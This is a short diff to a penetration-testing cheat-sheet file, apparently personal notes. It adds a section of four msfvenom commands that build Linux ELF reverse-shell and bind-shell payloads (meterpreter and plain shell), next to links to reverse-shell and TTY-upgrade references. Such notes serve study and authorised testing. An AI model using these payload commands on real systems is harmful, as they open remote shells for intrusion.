@@ -67,6 +67,13 @@ Also Java: Reverse shells cheat sheet
 [Payload All the Things Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) 
 
 
+## Msfvenom Payloads 
+
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf	
+    msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	
+    msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	
+    msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
+    
 ## Upgrading to a pseudo terminal / TTY     
 [Reference](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
 
